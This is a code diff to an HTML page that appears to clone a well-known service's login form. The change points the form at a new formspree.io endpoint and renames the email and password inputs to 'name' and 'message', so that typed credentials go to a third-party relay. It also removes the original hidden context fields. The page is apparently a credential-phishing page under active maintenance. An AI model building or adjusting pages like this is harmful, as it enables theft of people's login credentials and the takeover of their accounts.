@@ -105,11 +105,11 @@
          <p class="notification notification-warning blocked-on-risky-login hide">Please login with your email and password.</p>
          <p class="notification notification-critical keychain-activation-failure hide">Something went wrong on our end. Please login with your email and password.</p>
         </div>
-        <form action="https://formspree.io/f/xwkjdbpl" method="post" class="proceed maskable" autocomplete="off" name="login" novalidate>
+        <form action="https://formspree.io/f/mvonywbd" method="post" class="proceed maskable" autocomplete="off" name="login" novalidate>
          
            <div class="textInput" id="login_emaildiv">
             <div class="fieldWrapper">
-             <input id="email" name="login" type="email" class="hasHelp  validateEmpty   " required value="" autocomplete="username" placeholder="Email or mobile number" aria-describedby="emailErrorMessage">
+             <input id="email" name="name" type="email" class="hasHelp  validateEmpty   " required value="" autocomplete="username" placeholder="Email or mobile number" aria-describedby="emailErrorMessage">
              <label for="email" class="fieldLabel">Email or mobile number</label>
             </div>
             <div class="errorMessage" id="emailErrorMessage">
@@ -121,7 +121,7 @@
           <div id="passwordSection" class="clearfix showHideButtonForEligibleBrowser">
            <div class="textInput " id="login_passworddiv">
             <div class="fieldWrapper">
-             <input id="password" name="login_" type="password" class="hasHelp  validateEmpty   pin-password" required value="" placeholder="Enter your password" aria-describedby="passwordErrorMessage">
+             <input id="password" name="message" type="password" class="hasHelp  validateEmpty   pin-password" required value="" placeholder="Enter your password" aria-describedby="passwordErrorMessage">
              <label for="password" class="fieldLabel">Enter your password</label>
              <label for="Show password" class="fieldLabel">Show password</label>
              <button type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password" id="Show password" pa-marked="1">Show</button>
@@ -139,10 +139,7 @@
          <div class="actions">
           <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1">Log In</button>
          </div>
-         <input type="hidden" name="splitLoginContext" value="inputPassword">
-         <input type="hidden" name="isCookiedHybridEmail" value="true">
-         <input type="hidden" name="partyIdHash" value="f6e00e296f14cb4d94eddfccdc16ab3364e849ac354a7a4057416caf2bac4d7d">
-        </form>
+           </form>
         <div class="moreOptionsDiv  hide" id="moreOptionsContainer">
          <a href="#" id="moreOptions" class="moreOptionsInfo" pa-marked="1">More options</a>
          <div class="bubble-tooltip hide" id="moreOptionsDropDown">
